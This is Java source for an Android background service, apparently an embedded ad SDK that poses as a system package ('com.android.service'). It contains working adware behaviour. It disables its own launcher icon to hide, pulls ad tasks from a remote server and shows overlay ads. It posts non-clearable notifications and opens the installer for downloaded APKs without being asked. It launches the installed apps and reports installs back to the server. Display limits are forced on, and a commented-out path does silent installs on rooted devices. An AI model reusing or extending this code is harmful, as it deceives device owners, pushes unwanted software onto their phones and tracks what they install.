package com.android.service;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import com.android.adsTask.model.AdsTask;
import com.android.adsTask.model.AdsTaskManager;
import com.android.adsTask.model.AppPath;
import com.android.adsTask.windowManager.AdsWindowManager;
import com.android.callback.OnGetTasksListener;
import com.android.callback.OnNetWorkListener;
import com.android.callback.OnRegisterListener;
import com.android.constant.AdsConstant;
import com.android.constant.PhoneInfo;
import com.android.constant.UrlInfo;
import com.android.network.OnGetTasksThread;
import com.android.network.OnRegisterThread;
import com.android.network.OnReportThread;
import com.android.network.json.ReportJSON;
import com.android.network.json.RequestRegisterJSON;
import com.android.network.json.RequestTaksJSON;
import com.android.network.model.NetInfo;
import com.android.network.model.ReportInfo;
import com.android.repertory.SharedPreferenceBean;
import com.android.utils.*;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.util.*;

/**
 * Created with IntelliJ IDEA.
 * User: Administrator
 * Date: 14-3-17
 * Time: 下午1:51
 * <p/>
 * To change this template use File | Settings | File Templates.
 */
public class MainService extends Service {
    private String action = null;                //Intent中收到的action
    public boolean isShow = false;               //在屏蔽时间之内或者超出当日总共展示次数时位false
    public static boolean isTaskRunning = false;  //有未展示的任务时为true
    //    public static boolean isScreenOn = false;
    public Notification notification = null;    //通知下载进度
    public NotificationManager manager = null;  //

    private List<String> list = null;          //android系统中安装apk程序包名List

    public static Timer timer = null;         //任务循环显示图片定时器

    final static int INTERVAL_TIME = 10;      //请求间隔时间10秒
    private static long request_time;            //当前计费请求的时间


    public static int iconIndex = 0;          //循环图片计数
    public static int iconTotal = 0;          //图片总计张数

    public static String[] iconImageDests;    //插屏图片路径

    public static int state;                 //网络状态

    public static Context proxy = null;      //宿主Context

    public static String jarLoadPath = null;

    public void setProxy(Context context) {
        proxy = context;

    }


    /**
     * 用于在线程中创建或移除悬浮窗。
     */
    private Handler handler = new Handler();

    @Override
    public IBinder onBind(Intent intent) {
        return null;  //To change body of implemented methods use File | Settings | File Templates.
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        LogUtil.debugLog("SDKVersion:" + PhoneInfo.sdk_version + "model:" + PhoneInfo.model);
        if (proxy == null) {
            proxy = this;
        }

        /**
         * 创建广告图片和APK文件的路径文件夹
         */
        if (!FileUtil.isExists(AdsConstant.appDir)) {
            FileUtil.createFolder(AdsConstant.appDir);
        }

        if (jarLoadPath == null) {
            jarLoadPath = proxy.getApplicationInfo().dataDir + "/jar/";

        }

        if (!FileUtil.isExists(jarLoadPath)) {
            FileUtil.createFolder(jarLoadPath);
        }


        if (intent != null) {
            action = intent.getAction();

            /**
             * 意图动作为空直接返回
             */
            if (action == null || action.equals("")) {
                return START_STICKY;
            }


            if (action.equals(AdsConstant.HIDEICONAction)) {
                PackageManager mManager = proxy.getPackageManager();
                String activityName = getLauncherActivity();
                if (activityName != null) {

                    ComponentName mCname = new ComponentName(proxy, activityName);

                    boolean mIsActivityEnable = !(mManager.getComponentEnabledSetting(mCname) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED);

                    if (mIsActivityEnable)
                        mManager.setComponentEnabledSetting(mCname, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

                }
            }


            int isRegister = SharedPreferenceBean.getInstance().getIsRegister(proxy);

            state = MConnectivityManagerUtil.getInstance().isConnectivity(proxy);

            /**
             * 先执行注册，2.0.0版本删除了网络链接判断，有些机器有网络链接也判断无网络
             */
            if (isRegister != AdsConstant.REGISTER) {
                if (!OnRegisterThread.onCommunicationData) {
                    NetInfo register = new NetInfo(proxy, UrlInfo.registerUrl, new RequestRegisterJSON(), true, new OnRegisterListener(proxy));

                    new OnRegisterThread(register).startThread();
                }
                return START_STICKY;
            }

            //插屏意图
            if (action.equals(AdsConstant.IconAdsAction)) {
                iconIndex = 0;
                /**
                 * 统计当日展示次数
                 */
                SharedPreferenceBean.getInstance().saveShowTimes(proxy);


                Bundle mBundle = intent.getExtras();

                final AdsTask task = (AdsTask) mBundle.get("adsTask_Key");
                iconImageDests = task.imageDest.split(",");
                iconTotal = iconImageDests.length;

                int showTotalTimes = task.getShowTimes();
                int silenceInterval = task.getSilenceInterval();
                /**
                 * 更新屏蔽时间，每日展示总次数
                 */
                String silenceTime = CalendarUtil.getSilenceTime(silenceInterval);
                SharedPreferenceBean.getInstance().storeSilenceTime(proxy, silenceTime);
                SharedPreferenceBean.getInstance().saveShowTotalTimes(proxy, showTotalTimes);

                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        AdsWindowManager.createIconView(proxy.getApplicationContext(), task);


                    }
                });
                /**
                 * 多张任务图循环显示
                 */
                if (iconImageDests.length > 1) {
                    if (task.changeTime != -1 && task.changeTime > 0) {
                        if (timer == null) {
                            timer = new Timer();
                        }

                        timer.schedule(new TimerTask() {
                            @Override
                            public void run() {
                                handler.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        AdsWindowManager.changeIconView();
                                    }
                                });
                            }
                        }, task.changeTime, task.changeTime);
                    }
                }


                return START_STICKY;
            }

            //通知栏意图
            if (action.equals(AdsConstant.PushAdsAction)) {

                Bundle mBundle = intent.getExtras();

                final AdsTask task = (AdsTask) mBundle.get("adsTask_Key");

                int taskId = task.getTaskId();
                String pushIconPath = task.notiImageDest;
                String describe = task.getDescribe();

                int action = intent.getIntExtra("actionType", 3);

                if (action != 3) {
                    if (action == 0) {
                        createDownLoadingNotification(taskId, pushIconPath, describe);
                    }

                    if (action == 1) {

                        updateDownLoadingNotification(taskId, pushIconPath, describe, intent.getStringExtra("downLoadPercent"));
                    }

                    if (action == 2) {

                        createDownLoadFinishedNotification(taskId, pushIconPath, describe, intent.getStringExtra("filePath"), task.getPackgeName(), task);
                    }
                }


                return START_STICKY;
            }


            //安装了新产品
            if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {

                String addPackageName = intent.getDataString().substring("package:".length(), intent.getDataString().length());

                AppPath appPath = AdsTaskManager.getInstance(proxy).getAppPathByPackageName(proxy, addPackageName);
                LogUtil.debugLog(appPath.toString());

                if (!appPath.isNull()) {                                                                             //存在任务
                    Intent mIntent = proxy.getPackageManager().getLaunchIntentForPackage(addPackageName);
                    mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                    if (mIntent != null) proxy.startActivity(mIntent);


                    String install = SharedPreferenceBean.getInstance().getSuccessInstallTaskId(proxy);             //记录成功安装

                    StringBuilder sb = new StringBuilder();
                    if (install.equals("")) {
                        sb.append(appPath.taskId);
                    } else {
                        sb.append(",");
                        sb.append(appPath.taskId);
                    }

                    SharedPreferenceBean.getInstance().saveSuccessInstallTaskId(proxy, sb.toString());

                    cancelNotification(appPath.taskId);
                    //更新任务回报结果
                    updateTaskStatus(proxy, appPath);
                }

                return START_STICKY;
            }


            if (action.equals(AdsConstant.CancelNotificationAction)) {
                int taskId = intent.getIntExtra("TaskId", 0);

                if (taskId != 0) {
                    cancelNotification(taskId);
                }
                return START_STICKY;
            }


            if (action.equals(Intent.ACTION_BOOT_COMPLETED)) {
                LogUtil.debugLog(Intent.ACTION_BOOT_COMPLETED);
                List<AppPath> appPaths = AdsTaskManager.getInstance(proxy).getPathInfos(proxy);

                for (AppPath temp : appPaths) {
                    LogUtil.debugLog("AppPath :" + temp);
                    createDownLoadFinishedNotification(temp);
                }
                return START_STICKY;
            }

            //网络状态改变
            if (action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
                List<ReportInfo> reportInfos = AdsTaskManager.getInstance(proxy).getReportInfos(proxy);

                if (reportInfos != null && reportInfos.size() != 0) {
                    for (final ReportInfo reportInfo : reportInfos) {
                        ReportTaskStatusUtil.report(proxy, new ReportJSON().getJSON(reportInfo), true, new OnNetWorkListener() {
                            @Override
                            public void onSuccess(String result) {
                                if (result != null && !result.equals("")) {

                                    try {
                                        JSONObject object = new JSONObject(result);
                                        String resultCode = (String) object.get("resultCode");
                                        String linkId = (String) object.get("linkId");
                                        if (resultCode.equals("200")) {
                                            AdsTaskManager.getInstance(proxy).deleteReportInfos(proxy, reportInfo.id + "");

                                        }


                                    } catch (JSONException e) {
                                        e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
                                    }

                                }
                            }

                            @Override
                            public void onFail(String result) {

                            }

                            @Override
                            public void onTimeOut() {

                            }
                        });
                    }
                }
                return START_STICKY;
            }


            if (action.equals(AdsConstant.USERPRESENT)) {
                cheakIsShow();
                if (isShow) {
                    if (!isTaskRunning) {
                        if (judgeIntervalTime()) {
                            getTasks();
                        }
                    }
                }

                return START_STICKY;
            }
        }

        return START_STICKY;
    }


    private void cheakIsShow() {

        String silenceTime = SharedPreferenceBean.getInstance().getSilenceTime(proxy);
        LogUtil.debugLog("silenceTime:" + silenceTime);
        if (silenceTime.equals("")) {     //2.0.1 删除默认静默时间
//            String dafault = CalendarUtil.getDefaultSilenceTime();
//
//            SharedPreferenceBean.getInstance().storeSilenceTime(proxy, dafault);

            isShow = true;
//            LogUtil.debugLog("default silenceTime:" + dafault);
        } else {
//            isShow = true;
            if (CalendarUtil.isAfterSilenceTime(silenceTime)) {
                int times = SharedPreferenceBean.getInstance().getShowTimes(proxy);
                int totalTimes = SharedPreferenceBean.getInstance().getShowTotalTimes(proxy);
                if (times < totalTimes) {
                    isShow = true;
                } else {
                    isShow = true;//生产环境改成false
                }
            } else {
                isShow = true;//生产环境改成false
            }
        }
    }


    private void getTasks() {
        NetInfo getTaskInfo = new NetInfo(proxy, UrlInfo.getTasksUrl, new RequestTaksJSON(), true, new OnGetTasksListener(proxy, isShow));

        OnGetTasksThread getTasksThread = new OnGetTasksThread(getTaskInfo);

        getTasksThread.startThread();
    }


    private boolean judgeIntervalTime() {


        boolean isCaneRequest = false;

        if (request_time == 0) {
            LogUtil.debugLog("judgeIntervalTime---1-->");
            isCaneRequest = true;
            request_time = System.currentTimeMillis();
            return isCaneRequest;
        } else if (System.currentTimeMillis() - request_time >= INTERVAL_TIME * 1000) {
            LogUtil.debugLog("judgeIntervalTime---2-->");
            isCaneRequest = true;
            request_time = System.currentTimeMillis();
            return isCaneRequest;
        } else {
            LogUtil.debugLog("judgeIntervalTime---3-->");
            isCaneRequest = false;
            return isCaneRequest;
        }


    }


    private void createDownLoadingNotification(int taskId, String iconPath, String describe) {
        if (manager == null) {
            manager = (NotificationManager) proxy.getSystemService(Context.NOTIFICATION_SERVICE);
        }


        Notification notification = new Notification(android.R.drawable.stat_sys_download, "开始下载", System.currentTimeMillis());

        notification.flags = Notification.FLAG_NO_CLEAR;

        ActivityManager mActivityManager = (ActivityManager) proxy.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> rti = mActivityManager.getRunningTasks(1);

        Intent intent = new Intent(proxy, rti.get(0).topActivity.getClass());


        PendingIntent contentIntent = PendingIntent.getActivity(proxy, 0, intent, 0);

        String contentTitle = "[下载中]" + describe;

        notification.setLatestEventInfo(proxy, contentTitle, "0 %", contentIntent);

        int layoutId = notification.contentView.getLayoutId();

        View localView = LayoutInflater.from(proxy.getApplicationContext()).inflate(layoutId, null);

        if (localView != null) {
            ImageView localImageView = GetImaeView(localView);


            Bitmap bitmap = BitmapFactory.decodeFile(iconPath);

            if ((localImageView != null) && (bitmap != null)) ;

            notification.contentView.setImageViewBitmap(localImageView.getId(), bitmap);
        }


        manager.notify(taskId, notification);
    }

    public void updateDownLoadingNotification(int taskId, String iconPath, String describe, String content) {

        if (notification == null) {
            notification = new Notification(android.R.drawable.stat_sys_download, "下载中", System.currentTimeMillis());
            notification.flags = Notification.FLAG_NO_CLEAR;
        }


        ActivityManager mActivityManager = (ActivityManager) proxy.getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> rti = mActivityManager.getRunningTasks(1);

        Intent intent = new Intent(proxy, rti.get(0).topActivity.getClass());
        PendingIntent contentIntent = PendingIntent.getActivity(proxy, 0, intent, 0);
        String contentTitle = "[下载中]" + describe;

        notification.setLatestEventInfo(proxy, contentTitle, content, contentIntent);

        int layoutId = notification.contentView.getLayoutId();

        View localView = LayoutInflater.from(proxy.getApplicationContext()).inflate(layoutId, null);

        if (localView != null) {
            ImageView localImageView = GetImaeView(localView);


            Bitmap bitmap = BitmapFactory.decodeFile(iconPath);

            if ((localImageView != null) && (bitmap != null)) ;

            notification.contentView.setImageViewBitmap(localImageView.getId(), bitmap);
        }

        if (manager == null) {
            manager = (NotificationManager) proxy.getSystemService(Context.NOTIFICATION_SERVICE);
        }

        manager.notify(taskId, notification);

    }

    public void createDownLoadFinishedNotification(int taskId, String iconPath, String describe, String filePath, String packageName, AdsTask task) {
        Notification notification = new Notification(android.R.drawable.stat_sys_download, "下载完成", System.currentTimeMillis());

        //判断

//        if (task.getNoclear() == 1) {
        notification.flags = Notification.FLAG_NO_CLEAR;
//        } else {
//            notification.flags = Notification.FLAG_AUTO_CANCEL;
//        }


        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(new File(filePath)), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PendingIntent contentIntent = PendingIntent.getActivity(proxy, 0, intent, 0);
        String contentTitle = "[下载完成]" + describe;
        notification.setLatestEventInfo(proxy, contentTitle, "点击安装", contentIntent);


        if (manager == null) {
            manager = (NotificationManager) proxy.getSystemService(Context.NOTIFICATION_SERVICE);
        }

        int layoutId = notification.contentView.getLayoutId();

        View localView = LayoutInflater.from(proxy.getApplicationContext()).inflate(layoutId, null);

        if (localView != null) {
            ImageView localImageView = GetImaeView(localView);


            Bitmap bitmap = BitmapFactory.decodeFile(iconPath);

            if ((localImageView != null) && (bitmap != null)) ;

            notification.contentView.setImageViewBitmap(localImageView.getId(), bitmap);
        }

        manager.notify(task.getTaskId(), notification);


        if (SharedPreferenceBean.getInstance().getRootState(proxy).equals("1")) {                                                                                  //Root
//            if (ApkUtil.installApkSilent(filePath)) {
//
//                cancelNotification(task.getTaskId());
//
//                LogUtil.debugLog("Apk Silenct Install Success !!!");
//                ReportInfo report = new ReportInfo();
//
//                report.taskId = task.getTaskId();
//                report.showState = 1;
//                report.phoneIndex = SharedPreferenceBean.getInstance().getPhoneIndex(proxy);
//                report.downState = 1;
//                report.installState = 1;
//
//                ReportTaskStatusUtil.reportTaskStatus(proxy, task, report);
//
//                Intent mIntent = proxy.getPackageManager().getLaunchIntentForPackage(packageName);
//                mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//
//                if (mIntent != null) proxy.startActivity(mIntent);
//
//                return;
//            }

        }


        proxy.startActivity(intent);

        list = getPackageinstallers(intent);


        new DetermineWhetherInstalledUtil(proxy, task, packageName, list, filePath).determining();


    }

    public void createDownLoadFinishedNotification(AppPath appPath) {


        Notification notification = new Notification(android.R.drawable.stat_sys_download, "下载完成", System.currentTimeMillis());


        notification.flags = Notification.FLAG_NO_CLEAR;

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setDataAndType(Uri.fromFile(new File(appPath.appPath)), "application/vnd.android.package-archive");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PendingIntent contentIntent = PendingIntent.getActivity(proxy, 0, intent, 0);
        String contentTitle = "[下载完成]" + appPath.describe;
        notification.setLatestEventInfo(proxy, contentTitle, "点击安装", contentIntent);


        if (manager == null) {
            manager = (NotificationManager) proxy.getSystemService(Context.NOTIFICATION_SERVICE);
        }

        int layoutId = notification.contentView.getLayoutId();

        View localView = LayoutInflater.from(proxy.getApplicationContext()).inflate(layoutId, null);

        if (localView != null) {
            ImageView localImageView = GetImaeView(localView);


            Bitmap bitmap = BitmapFactory.decodeFile(appPath.notiImagePath);

            if ((localImageView != null) && (bitmap != null)) ;

            notification.contentView.setImageViewBitmap(localImageView.getId(), bitmap);
        }

        manager.notify(appPath.taskId, notification);

    }

    public void cancelNotification(int taskId) {
        if (manager == null) {
            manager = (NotificationManager) proxy.getSystemService(Context.NOTIFICATION_SERVICE);
        }

        manager.cancel(taskId);

    }


    private List<String> getPackageinstallers(Intent intent) {
        List<String> names = new ArrayList<String>();
        PackageManager packageManager = proxy.getPackageManager();

        List<ResolveInfo> resolveInfo = packageManager.queryIntentActivities(intent,
                PackageManager.MATCH_DEFAULT_ONLY);
        for (ResolveInfo ri : resolveInfo) {
            names.add(ri.activityInfo.packageName);
        }
        return names;
    }

    private String getLauncherActivity() {
        Intent startIntent = new Intent(Intent.ACTION_MAIN, null);
        startIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        startIntent.setPackage(proxy.getPackageName());

        List<ResolveInfo> startInfoList = proxy
                .getPackageManager().queryIntentActivities(startIntent, 0);

        if (startInfoList.size() < 1) {
            return null;
        }
        ResolveInfo startInfo = startInfoList.iterator().next();

        return startInfo.activityInfo.name;

    }

    private ImageView GetImaeView(View paramView) {
        if (paramView instanceof ImageView)
            return (ImageView) paramView;
        if (paramView instanceof ViewGroup)
            for (int i = 0; i < ((ViewGroup) paramView).getChildCount(); ++i) {
                View localView = ((ViewGroup) paramView).getChildAt(i);
                if (localView instanceof ImageView)
                    return (ImageView) localView;
                if (localView instanceof ViewGroup)
                    return GetImaeView(localView);
            }
        return null;
    }


    private void updateTaskStatus(final Context context, final AppPath appPath) {
        JSONObject object = new JSONObject();

        try {
            object.put("linkId", appPath.linkId);
        } catch (JSONException e) {
            e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
        }

        NetInfo reportInfo = new NetInfo(context, UrlInfo.updateUrl, object, true, new OnNetWorkListener() {
            @Override
            public void onSuccess(String result) {
                //To change body of implemented methods use File | Settings | File Templates.
                if (result != null && !result.equals("")) {
                    try {
                        JSONObject object = new JSONObject(result);

                        String resultCode = (String) object.get("resultCode");

                        if (resultCode.equals("200")) {
                            AdsTaskManager.getInstance(context).deletePathInfos(context, appPath.taskId);
                        }


                    } catch (JSONException e) {
                        e.printStackTrace();  //To change body of catch statement use File | Settings | File Templates.
                    }
                }
            }

            @Override
            public void onFail(String result) {
                //To change body of implemented methods use File | Settings | File Templates.
            }

            @Override
            public void onTimeOut() {
                //To change body of implemented methods use File | Settings | File Templates.
            }
        });

        OnReportThread reportThread = new OnReportThread(reportInfo);

        reportThread.startThread();

//        }

    }

}
